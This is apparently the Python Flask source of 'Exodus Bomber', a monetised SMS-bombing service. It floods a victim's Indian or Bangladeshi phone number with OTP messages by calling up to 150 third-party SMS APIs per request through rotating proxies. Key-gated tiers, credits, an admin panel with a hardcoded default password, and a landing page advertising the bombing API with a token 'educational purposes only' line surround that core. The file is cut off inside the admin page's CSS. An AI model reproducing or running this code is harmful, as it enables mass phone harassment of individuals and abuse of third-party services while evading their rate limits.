"""
EXODUS SMS BOMBER — API + Admin Panel + Webview
Developer: @exodus_own3r
"""

import os, re, json, time, html, random, secrets, threading
from datetime import datetime, timezone
from functools import wraps

import requests
from flask import Flask, request, jsonify, session as flask_session, redirect, render_template_string

# ═══════════════════════════════════════════════════════════════
#  FIREBASE SETUP
# ═══════════════════════════════════════════════════════════════
try:
    import firebase_admin
    from firebase_admin import credentials, firestore
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False

_db = None

def _init_firebase():
    global _db
    if not FIREBASE_AVAILABLE:
        print("⚠️ firebase-admin not installed, using in-memory fallback")
        return None
    try:
        fb_key_json = os.environ.get("FIREBASE_KEY_JSON")
        fb_key_path = os.environ.get("FIREBASE_KEY_PATH", "firebase-key.json")
        if fb_key_json:
            cred = credentials.Certificate(json.loads(fb_key_json))
        elif os.path.exists(fb_key_path):
            cred = credentials.Certificate(fb_key_path)
        else:
            print("❌ No Firebase credentials found")
            return None
        firebase_admin.initialize_app(cred)
        _db = firestore.client()
        print("✅ Firebase initialized")
        return _db
    except Exception as e:
        print(f"❌ Firebase error: {e}")
        return None

_init_firebase()

# ═══════════════════════════════════════════════════════════════
#  ENV
# ═══════════════════════════════════════════════════════════════
def _load_dotenv(path=".env"):
    if not os.path.exists(path): return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line: continue
            k, _, v = line.partition("=")
            k, v = k.strip(), v.strip().strip('"').strip("'")
            if k and k not in os.environ: os.environ[k] = v
    print(f"✅ Loaded {path}")

_load_dotenv()

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Exodus_OWN3R")
DEVELOPER      = os.environ.get("DEVELOPER_TAG", "@exodus_own3r")
DEVELOPER_URL  = os.environ.get("DEVELOPER_URL", "https://t.me/exodus_own3r")
CONTACT        = os.environ.get("CONTACT_USERNAME", "exodus_own3r").lstrip("@")
CONTACT_URL    = f"https://t.me/{CONTACT}"
PORT           = int(os.environ.get("PORT", 5000))
SECRET_KEY     = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
BASE_URL       = os.environ.get("BASE_URL", f"http://localhost:{PORT}").rstrip("/")
BOT_USERNAME   = os.environ.get("BOT_USERNAME", "Exodus_bomberbot")

CREDITS_PER_REFERRAL     = int(os.environ.get("CREDITS_PER_REFERRAL", "10"))
CREDITS_PER_BOMB_NORMAL  = int(os.environ.get("CREDITS_PER_BOMB_NORMAL", "1"))
CREDITS_PER_BOMB_PREMIUM = int(os.environ.get("CREDITS_PER_BOMB_PREMIUM", "2"))
CREDITS_PER_BOMB_NUCLEAR = int(os.environ.get("CREDITS_PER_BOMB_NUCLEAR", "3"))

IND_NORMAL_APIS  = int(os.environ.get("IND_NORMAL_APIS", "50"))
IND_PREMIUM_APIS = int(os.environ.get("IND_PREMIUM_APIS", "100"))
IND_NUCLEAR_APIS = int(os.environ.get("IND_NUCLEAR_APIS", "150"))
BD_APIS_PER_BOMB = os.environ.get("BD_APIS_PER_BOMB", "all")

PROXY_FILE = os.environ.get("PROXY_FILE", "proxies.txt")
USE_PROXY  = os.environ.get("USE_PROXY", "true").lower() in ("1","true","yes","on")

REQUIRE_API_KEY = os.environ.get("REQUIRE_API_KEY", "true").lower() in ("1","true","yes","on")
API_DAILY_LIMIT = int(os.environ.get("API_DAILY_LIMIT", "500"))

# ═══════════════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════════════
def fb_get_user(uid):
    if not _db: return None
    try:
        doc = _db.collection("users").document(str(uid)).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_set_user(uid, data):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).set(data, merge=True)
        return True
    except: return False

def fb_update_user(uid, **kwargs):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).update(kwargs)
        return True
    except: return False

def fb_all_users(limit=500):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("users").limit(limit).stream()]
    except: return []

def fb_get_key_by_key(key):
    if not _db: return None
    try:
        doc = _db.collection("keys").document(key).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_get_key_by_user(uid):
    if not _db: return None
    try:
        docs = _db.collection("keys").where("user_id", "==", str(uid)) \
            .where("revoked", "==", False) \
            .order_by("expires_at", direction=firestore.Query.DESCENDING).limit(1).stream()
        for d in docs:
            return d.to_dict()
        return None
    except: return None

def fb_set_key(key, data):
    if not _db: return False
    try:
        _db.collection("keys").document(key).set(data)
        return True
    except: return False

def fb_update_key(key, **kwargs):
    if not _db: return False
    try:
        _db.collection("keys").document(key).update(kwargs)
        return True
    except: return False

def fb_all_keys(limit=200):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("keys").order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_all_channels():
    if not _db: return []
    try:
        return [dict(d.to_dict(), id=d.id) for d in _db.collection("channels").stream()]
    except: return []

def fb_add_channel(chat_id, title, link):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).set({
            "chat_id": str(chat_id), "title": title, "link": link,
            "added_at": int(time.time())
        })
        return True
    except: return False

def fb_del_channel(chat_id):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).delete()
        return True
    except: return False

def fb_get_setting(k, default=None):
    if not _db: return default
    try:
        doc = _db.collection("settings").document(k).get()
        return doc.to_dict().get("v") if doc.exists else default
    except: return default

def fb_set_setting(k, v):
    if not _db: return False
    try:
        _db.collection("settings").document(k).set({"v": str(v)})
        return True
    except: return False

def fb_all_gifts(limit=100):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("gift_codes").order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_set_gift(code, data):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).set(data)
        return True
    except: return False

def fb_del_gift(code):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).delete()
        return True
    except: return False

def fb_usage_today(key):
    if not _db: return 0
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        doc = _db.collection("usage").document(f"{key}_{today}").get()
        return doc.to_dict().get("count", 0) if doc.exists else 0
    except: return 0

def fb_incr_usage(key):
    if not _db: return 0
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        ref = _db.collection("usage").document(f"{key}_{today}")
        ref.set({"key": key, "day": today, "count": firestore.Increment(1)}, merge=True)
        doc = ref.get()
        return doc.to_dict().get("count", 1) if doc.exists else 1
    except: return 0

def daily_limit():
    try: return int(fb_get_setting("daily_limit", API_DAILY_LIMIT))
    except: return API_DAILY_LIMIT

def validate_key(key):
    if not key: return False, 401, "API key required"
    row = fb_get_key_by_key(key)
    if not row: return False, 401, "Invalid API key"
    if row.get("revoked"): return False, 403, "Key revoked"
    if row.get("expires_at", 0) <= int(time.time()): return False, 401, "Key expired"
    u = fb_get_user(row.get("user_id", ""))
    if u and u.get("banned"): return False, 403, "Account banned"
    limit = row.get("daily_limit") or daily_limit()
    count = fb_incr_usage(key)
    if count > limit: return False, 429, f"Daily limit reached ({limit}/day)"
    return True, 200, "ok"

# ═══════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════
_proxies = []
_proxy_lock = threading.Lock()

def load_proxies():
    global _proxies
    if not USE_PROXY or not os.path.exists(PROXY_FILE): return
    with open(PROXY_FILE) as f:
        _proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    print(f"✅ Loaded {len(_proxies)} proxies")

def get_proxy():
    if not USE_PROXY or not _proxies: return None
    with _proxy_lock: return random.choice(_proxies)

# ═══════════════════════════════════════════════════════════════
#  API LOADER
# ═══════════════════════════════════════════════════════════════
_apis = {"india": [], "bangladesh": []}
_api_lock = threading.Lock()

def load_apis():
    global _apis
    with _api_lock:
        for country in ("india", "bangladesh"):
            path = f"apis/{country}.json"
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        data = json.load(f)
                    _apis[country] = [a for a in data if a.get("enabled", True)]
                    print(f"✅ Loaded {len(_apis[country])} {country} APIs")
                except Exception as e:
                    print(f"⚠️ Error loading {path}: {e}")

def call_api(api, number):
    try:
        proxy = get_proxy()
        proxies = {"http": proxy, "https": proxy} if proxy else None
        headers = api.get("headers", {})
        headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36")
        body = api.get("body", "").replace("{number}", number)
        method = api.get("method", "POST").upper()
        if method == "POST":
            r = requests.post(api["url"], data=body, headers=headers, proxies=proxies, timeout=8)
        else:
            url = api["url"].replace("{number}", number)
            r = requests.get(url, headers=headers, proxies=proxies, timeout=8)
        return r.status_code in (200, 201, 202)
    except:
        return False

def bomb_country(country, number, max_apis):
    apis = _apis.get(country, [])
    if not apis: return 0, 0
    random.shuffle(apis)
    selected = apis[:min(max_apis, len(apis))] if max_apis > 0 else apis
    success = 0
    for api in selected:
        if call_api(api, number): success += 1
    return success, len(selected)

# ═══════════════════════════════════════════════════════════════
#  FLASK
# ═══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.json.sort_keys = False
admin_tokens = set()

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        token = request.headers.get("X-Admin-Token") or flask_session.get("admin_token")
        if not token or token not in admin_tokens:
            if request.path.startswith("/admin/api/"): return jsonify({"error": "Unauthorized"}), 401
            return redirect("/admin/login")
        return f(*a, **kw)
    return wrapper

def _get_key():
    if not REQUIRE_API_KEY: return True, 200, "ok"
    key = request.headers.get("X-API-Key") or request.args.get("key") or ""
    if not key and request.is_json:
        key = (request.get_json(silent=True) or {}).get("key", "")
    return validate_key(key.strip())

@app.route("/ind", methods=["GET", "POST"])
def api_ind():
    ok, code, msg = _get_key()
    if not ok: return jsonify({"status": False, "message": msg}), code
    number = (request.args.get("number") or (request.get_json(silent=True) or {}).get("number", "")).strip()
    if not number or len(number) < 10: return jsonify({"status": False, "message": "Invalid number"}), 400
    tier = (request.args.get("tier") or "normal").lower()
    if tier == "premium": max_apis = IND_PREMIUM_APIS
    elif tier == "nuclear": max_apis = IND_NUCLEAR_APIS
    else: max_apis = IND_NORMAL_APIS
    success, total = bomb_country("india", number, max_apis)
    return jsonify({"status": True, "country": "india", "number": number, "tier": tier,
                    "sent": success, "total_apis": total})

@app.route("/bd", methods=["GET", "POST"])
def api_bd():
    ok, code, msg = _get_key()
    if not ok: return jsonify({"status": False, "message": msg}), code
    number = (request.args.get("number") or (request.get_json(silent=True) or {}).get("number", "")).strip()
    if not number or len(number) < 10: return jsonify({"status": False, "message": "Invalid number"}), 400
    max_apis = 0 if BD_APIS_PER_BOMB == "all" else int(BD_APIS_PER_BOMB)
    success, total = bomb_country("bangladesh", number, max_apis)
    return jsonify({"status": True, "country": "bangladesh", "number": number,
                    "sent": success, "total_apis": total})

@app.route("/status")
def status():
    users = fb_all_users(5000)
    bombs = sum(u.get("total_bombs", 0) for u in users)
    return jsonify({"status": True, "developer": DEVELOPER, "users": len(users),
                    "bombs": bombs, "india_apis": len(_apis["india"]),
                    "bd_apis": len(_apis["bangladesh"])})

@app.route("/admin")
@app.route("/admin/")
def admin_index(): return render_template_string(ADMIN_HTML)

@app.route("/admin/login")
def admin_login_page(): return render_template_string(ADMIN_HTML)

@app.route("/admin/api/login", methods=["POST"])
def admin_login():
    d = request.get_json(silent=True) or {}
    if d.get("password") != ADMIN_PASSWORD: return jsonify({"error": "Invalid password"}), 401
    token = secrets.token_hex(32)
    admin_tokens.add(token)
    threading.Timer(86400, lambda: admin_tokens.discard(token)).start()
    return jsonify({"token": token})

@app.route("/admin/api/stats")
@require_auth
def admin_stats():
    users = fb_all_users(5000)
    keys = fb_all_keys(5000)
    now = int(time.time())
    return jsonify({
        "users": len(users),
        "banned": sum(1 for u in users if u.get("banned")),
        "keys": sum(1 for k in keys if k.get("expires_at",0) > now and not k.get("revoked")),
        "bombs": sum(u.get("total_bombs",0) for u in users),
        "channels": len(fb_all_channels()),
        "india_apis": len(_apis["india"]),
        "bd_apis": len(_apis["bangladesh"]),
        "premium": sum(1 for u in users if u.get("is_premium")),
    })

@app.route("/admin/api/users")
@require_auth
def admin_users():
    return jsonify(fb_all_users(500))

@app.route("/admin/api/users/<uid>/ban", methods=["POST"])
@require_auth
def admin_ban(uid):
    fb_update_user(uid, banned=True)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/unban", methods=["POST"])
@require_auth
def admin_unban(uid):
    fb_update_user(uid, banned=False)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/credits", methods=["POST"])
@require_auth
def admin_credits(uid):
    d = request.get_json(silent=True) or {}
    amt = int(d.get("amount", 0))
    if not _db: return jsonify({"error": "Firebase not connected"}), 500
    _db.collection("users").document(str(uid)).set(
        {"credits": firestore.Increment(amt)}, merge=True)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/premium", methods=["POST"])
@require_auth
def admin_premium(uid):
    d = request.get_json(silent=True) or {}
    fb_update_user(uid, is_premium=bool(d.get("premium", True)))
    return jsonify({"success": True})

@app.route("/admin/api/channels")
@require_auth
def admin_channels():
    return jsonify(fb_all_channels())

@app.route("/admin/api/channels", methods=["POST"])
@require_auth
def admin_add_channel():
    d = request.get_json(silent=True) or {}
    chat_id = d.get("chat_id","").strip()
    title = d.get("title","").strip()
    link = d.get("link","").strip()
    if not chat_id: return jsonify({"error": "chat_id required"}), 400
    fb_add_channel(chat_id, title, link)
    return jsonify({"success": True})

@app.route("/admin/api/channels/<chat_id>", methods=["DELETE"])
@require_auth
def admin_del_channel(chat_id):
    fb_del_channel(chat_id)
    return jsonify({"success": True})

@app.route("/admin/api/keys")
@require_auth
def admin_keys():
    return jsonify(fb_all_keys(100))

@app.route("/admin/api/keys", methods=["POST"])
@require_auth
def admin_gen_key():
    d = request.get_json(silent=True) or {}
    uid = str(d.get("user_id", ""))
    days = int(d.get("days", 30))
    if not uid or not fb_get_user(uid):
        return jsonify({"error": "User not found"}), 404
    key = f"EXO-{secrets.token_hex(12).upper()}"
    exp = int(time.time()) + days * 86400
    fb_set_key(key, {"key": key, "user_id": uid, "created_at": int(time.time()),
                     "expires_at": exp, "revoked": False,
                     "daily_limit": daily_limit(), "plan": f"Admin {days}d"})
    return jsonify({"success": True, "key": key, "expires_at": exp})

@app.route("/admin/api/keys/<key>", methods=["DELETE"])
@require_auth
def admin_revoke_key(key):
    fb_update_key(key, revoked=True)
    return jsonify({"success": True})

@app.route("/admin/api/gift")
@require_auth
def admin_gift_list():
    return jsonify(fb_all_gifts(100))

@app.route("/admin/api/gift", methods=["POST"])
@require_auth
def admin_gift_create():
    d = request.get_json(silent=True) or {}
    credits = int(d.get("credits", 0))
    max_users = int(d.get("max_users", 0))
    days_valid = int(d.get("days_valid", 7))
    if credits <= 0: return jsonify({"error": "Credits must be > 0"}), 400
    code = "EXO-GIFT-" + secrets.token_hex(4).upper()
    exp = int(time.time()) + days_valid * 86400 if days_valid > 0 else 0
    fb_set_gift(code, {"code": code, "credits": credits, "max_users": max_users,
                       "claimed_count": 0, "expires_at": exp, "created_at": int(time.time())})
    return jsonify({"success": True, "code": code, "credits": credits,
                    "max_users": max_users, "expires_at": exp})

@app.route("/admin/api/gift/<code>", methods=["DELETE"])
@require_auth
def admin_gift_delete(code):
    fb_del_gift(code)
    return jsonify({"success": True})

@app.route("/admin/api/export")
@require_auth
def admin_export():
    users = fb_all_users(5000)
    keys = fb_all_keys(5000)
    gifts = fb_all_gifts(5000)
    chans = fb_all_channels()
    return jsonify({"users": users, "keys": keys, "gifts": gifts, "channels": chans,
                    "exported_at": datetime.now(timezone.utc).isoformat()})

@app.route("/admin/api/import", methods=["POST"])
@require_auth
def admin_import():
    d = request.get_json(silent=True) or {}
    count = {"users": 0, "keys": 0, "gifts": 0, "channels": 0}
    for u in d.get("users", []):
        try:
            fb_set_user(u.get("id"), u)
            count["users"] += 1
        except: pass
    for k in d.get("keys", []):
        try:
            fb_set_key(k.get("key"), k)
            count["keys"] += 1
        except: pass
    for g in d.get("gifts", []):
        try:
            fb_set_gift(g.get("code"), g)
            count["gifts"] += 1
        except: pass
    for c in d.get("channels", []):
        try:
            fb_add_channel(c.get("chat_id"), c.get("title"), c.get("link"))
            count["channels"] += 1
        except: pass
    return jsonify({"success": True, "imported": count})

@app.route("/admin/api/settings")
@require_auth
def admin_settings_get():
    return jsonify({"daily_limit": daily_limit()})

@app.route("/admin/api/settings", methods=["POST"])
@require_auth
def admin_settings_set():
    d = request.get_json(silent=True) or {}
    if "daily_limit" in d: fb_set_setting("daily_limit", int(d["daily_limit"]))
    return jsonify({"success": True})

@app.route("/admin/api/reload-apis", methods=["POST"])
@require_auth
def admin_reload_apis():
    load_apis()
    return jsonify({"success": True, "india": len(_apis["india"]), "bd": len(_apis["bangladesh"])})

@app.route("/")
def home(): return render_template_string(HOME_HTML)

# ═══════════════════════════════════════════════════════════════
#  HTML
# ═══════════════════════════════════════════════════════════════
HOME_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Exodus Bomber — SMS Bombing API</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#030712;color:#e2e8f0;min-height:100vh;overflow-x:hidden}
.bubbles{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}
.bubble{position:absolute;border-radius:50%;opacity:.15;animation:float linear infinite;filter:blur(2px)}
@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:.15}90%{opacity:.1}100%{transform:translateY(-100px) scale(1);opacity:0}}
.wrap{position:relative;z-index:10;max-width:900px;margin:0 auto;padding:2rem 1rem 4rem}
.hero{text-align:center;padding:3rem 1rem 2rem}
.hero-icon{width:80px;height:80px;margin:0 auto 1.5rem;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border-radius:1.25rem;display:flex;align-items:center;justify-content:center;font-size:2.5rem;box-shadow:0 0 40px rgba(139,92,246,.3);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
.hero-title{font-size:clamp(2rem,6vw,3.5rem);font-weight:900;letter-spacing:-.02em;background:linear-gradient(90deg,#8b5cf6,#06b6d4,#ec4899);background-size:200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:grad 6s ease infinite;margin-bottom:1rem}
@keyframes grad{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
.hero-sub{color:#64748b;font-family:'JetBrains Mono',monospace;font-size:.85rem;letter-spacing:.12em;text-transform:uppercase;max-width:600px;margin:0 auto 2rem;line-height:1.8}
.btns{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:.5rem;padding:.9rem 2rem;border-radius:.75rem;font-weight:700;font-size:.9rem;text-decoration:none;transition:all .2s;border:none;cursor:pointer}
.btn-p{background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:#fff;box-shadow:0 0 25px rgba(139,92,246,.4)}
.btn-p:hover{opacity:.9;transform:translateY(-2px)}
.btn-o{background:transparent;border:1px solid rgba(255,255,255,.15);color:#e2e8f0}
.btn-o:hover{background:rgba(255,255,255,.05)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;margin:3rem 0}
.stat{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:1rem;padding:1.25rem;text-align:center}
.stat-v{font-size:1.75rem;font-weight:900;color:#06b6d4;font-family:'JetBrains Mono',monospace}
.stat-l{font-size:.7rem;color:#64748b;text-transform:uppercase;letter-spacing:.1em;margin-top:.25rem}
.card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:1rem;padding:1.5rem;margin-bottom:1rem}
.card h3{font-size:1rem;font-weight:800;margin-bottom:.75rem;color:#8b5cf6}
.card p{color:#94a3b8;font-size:.85rem;line-height:1.7}
.card code{background:#0f172a;border:1px solid rgba(255,255,255,.1);padding:.15rem .4rem;border-radius:.3rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:#22d3ee}
.footer{text-align:center;margin-top:3rem;padding-top:2rem;border-top:1px solid rgba(255,255,255,.07);color:#64748b;font-size:.8rem}
.footer a{color:#8b5cf6;text-decoration:none}
</style>
</head>
<body>
<div class="bubbles" id="bub"></div>
<div class="wrap">
  <div class="hero">
    <div class="hero-icon">💣</div>
    <h1 class="hero-title">Exodus Bomber</h1>
    <p class="hero-sub">India &amp; Bangladesh SMS Bombing API</p>
    <div class="btns">
      <a class="btn btn-p" href="https://t.me/{{BOT_USERNAME}}">🤖 Open Bot</a>
      <a class="btn btn-o" href="/admin">🛡️ Admin Panel</a>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="stat-v" id="s-users">—</div><div class="stat-l">Users</div></div>
    <div class="stat"><div class="stat-v" id="s-bombs">—</div><div class="stat-l">Bombs Sent</div></div>
    <div class="stat"><div class="stat-v" id="s-ind">—</div><div class="stat-l">India APIs</div></div>
    <div class="stat"><div class="stat-v" id="s-bd">—</div><div class="stat-l">BD APIs</div></div>
  </div>
  <div class="card">
    <h3>🔗 API Endpoints</h3>
    <p><code>GET /ind?key=YOUR_KEY&amp;number=91XXXXXXXXXX&amp;tier=normal</code><br>
       <code>GET /bd?key=YOUR_KEY&amp;number=88XXXXXXXXXX</code></p>
    <p style="margin-top:.75rem">Tiers: <code>normal</code> · <code>premium</code> · <code>nuclear</code> (premium only)</p>
  </div>
  <div class="card">
    <h3>🎁 Get API Key</h3>
    <p>Refer friends in the bot → earn referral points → claim API key.<br>
       5 refs = 7 days &nbsp;|&nbsp; 10 refs = 15 days &nbsp;|&nbsp; 20 refs = 1 month</p>
    <p style="margin-top:.75rem">Or <a href="https://t.me/{{CONTACT}}" style="color:#8b5cf6">contact developer</a> to buy directly.</p>
  </div>
  <div class="card">
    <h3>💣 Bomb Tiers (India)</h3>
    <p><b>Normal</b> — 1 credit · 50 APIs<br>
       <b>Premium</b> — 2 credits · 100 APIs<br>
       <b>Nuclear</b> — 3 credits · 150 APIs (Premium only)</p>
    <p style="margin-top:.75rem"><b>Bangladesh</b> — 1 credit · all BD APIs</p>
  </div>
  <div class="footer">
    <p>Powered by <a href="{{DEVELOPER_URL}}">{{DEVELOPER}}</a></p>
    <p style="margin-top:.5rem">This service is for educational purposes only.</p>
  </div>
</div>
<script>
const colors=['#8b5cf6','#06b6d4','#ec4899','#22c55e','#f59e0b'];
const bub=document.getElementById('bub');
for(let i=0;i<22;i++){const b=document.createElement('div');b.className='bubble';const sz=Math.random()*50+15;
b.style.cssText=`width:${sz}px;height:${sz}px;left:${Math.random()*100}%;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${Math.random()*15+10}s;animation-delay:${Math.random()*-20}s`;
bub.appendChild(b);}
async function load(){try{const d=await (await fetch('/status')).json();
document.getElementById('s-users').textContent=d.users||0;
document.getElementById('s-bombs').textContent=d.bombs||0;
document.getElementById('s-ind').textContent=d.india_apis||0;
document.getElementById('s-bd').textContent=d.bd_apis||0;}catch(e){}}
load();setInterval(load,10000);
</script>
</body></html>"""

ADMIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Exodus Bomber — Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
  :root{--bg:#030712;--bg2:#0d1117;--card:rgba(255,255,255,.03);--border:rgba(255,255,255,.07);--violet:#8b5cf6;--cyan:#06b6d4;--pink:#ec4899;--green:#22c55e;--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--text:#e2e8f0;--muted:#64748b}
  body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
  .bubbles{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}
  .bubble{position:absolute;border-radius:50%;opacity:.15;animation:float linear infinite;filter:blur(2px)}
  @keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:.15}90%{opacity:.1}100%{transform:translateY(-100px) scale(1);opacity:0}}
  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;position:relative;z-index:10;padding:1rem}
  .login-card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);backdrop-filter:blur(24px);border-radius:1.25rem;padding:2.5rem;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,.8);animation:slideUp .5s ease}
  @keyframes slideUp{from{opacity:0;transform:translateY(24px) scale(.97)}to{opacity:1;transform:none}}
  .login-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--violet),var(--cyan),var(--pink))}
  .login-icon{width:64px;height:64px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:1rem;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;font-size:2rem}
  .login-title{text-align:center;font-size:1.75rem;font-weight:900;text-transform:uppercase;letter-spacing:.1em;background:linear-gradient(90deg,var(--violet),var(--cyan),var(--pink));background-size:200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:grad 6s ease infinite;background-clip:text;margin-bottom:.25rem}
  @keyframes grad{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
  .login-sub{text-align:center;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:.75rem;letter-spacing:.15em;margin-bottom:2rem}
  .form-input{width:100%;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.1);border-radius:.75rem;padding:1rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.9rem;letter-spacing:.2em;text-align:center;outline:none;transition:border-color .2s}
  .form-input:focus{border-color:var(--violet);box-shadow:0 0 0 2px rgba(139,92,246,.2)}
  .btn-primary{width:100%;padding:1rem;background:linear-gradient(135deg,var(--violet),var(--cyan));border:none;border-radius:.75rem;color:#fff;font-weight:700;font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;cursor:pointer;transition:opacity .2s,transform .1s;box-shadow:0 0 20px rgba(139,92,246,.4)}
  .btn-primary:hover{opacity:.9}
  .btn-primary:active{transform:scale(.98)}
  .btn-primary:disabled{opacity:.5;cursor:not-allowed}
  .err-msg{color:var(--red);font-size:.8rem;margin-top:.75rem;text-align:center;font-family:'JetBrains Mono',monospace}
  .app{display:none;min-height:100vh}
  .app.visible{display:flex}
  .sidebar{width:240px;min-height:100vh;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;position:sticky;top:0;height:100vh;overflow-y:auto;z-index:10}
  .sidebar-logo{padding:1.5rem 1.25rem;border-bottom:1px solid var(--border)}
  .sidebar-logo-text{font-weight:900;font-size:1rem;text-transform:uppercase;letter-spacing:.1em;background:linear-gradient(90deg,var(--violet),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:grad 6s ease infinite;background-size:200%}
  .sidebar-sub{font-size:.65rem;color:var(--muted);font-family:'JetBrains Mono',monospace;letter-spacing:.1em;margin-top:.2rem}
  .sidebar-nav{flex:1;padding:.75rem}
  .nav-item{display:flex;align-items:center;gap:.75rem;padding:.65rem .875rem;border-radius:.625rem;color:var(--muted);font-size:.85rem;font-weight:500;cursor:pointer;transition:all .15s;margin-bottom:.25rem;border:none;background:none;width:100%;text-align:left}
  .nav-item:hover{background:rgba(255,255,255,.04);color:var(--text)}
  .nav-item.active{background:rgba(139,92,246,.15);color:var(--violet);border:1px solid rgba(139,92,246,.2)}
  .nav-icon{font-size:1rem;width:1.25rem;text-align:center}
  .sidebar-footer{padding:.75rem;border-top:1px solid var(--border)}
  .btn-logout{display:flex;align-items:center;gap:.75rem;padding:.65rem .875rem;border-radius:.625rem;color:var(--red);font-size:.85rem;font-weight:500;cursor:pointer;transition:all .15s;border:none;background:none;width:100%}
  .btn-logout:hover{background:rgba(239,68,68,.1)}
  .main{flex:1;overflow-y:auto;background:var(--bg);position:relative;z-index:5}
  .page{display:none;padding:2rem;max-width:1200px}
  .page.active{display:block}
  .page-header{margin-bottom:2rem}
  .page-title{font-size:1.75rem;font-weight:900;text-transform:uppercase;letter-spacing:.08em;background:linear-gradient(90deg,var(--violet),var(--cyan),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:grad 6s ease infinite;background-size:200%}
  .page-sub{color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:.75rem;letter-spacing:.1em;margin-top:.25rem}
  .glass{background:var(--card);border:1px solid var(--border);backdrop-filter:blur(12px);border-radius:1rem}
  .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-bottom:2rem}
  .stat-card{padding:1.25rem;position:relative;overflow:hidden}
  .stat-card-icon{font-size:1.5rem;margin-bottom:.75rem}
  .stat-card-value{font-size:2rem;font-weight:900;margin-bottom:.25rem}
  .stat-card-label{font-size:.7rem;color:var(--muted);font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.1em}
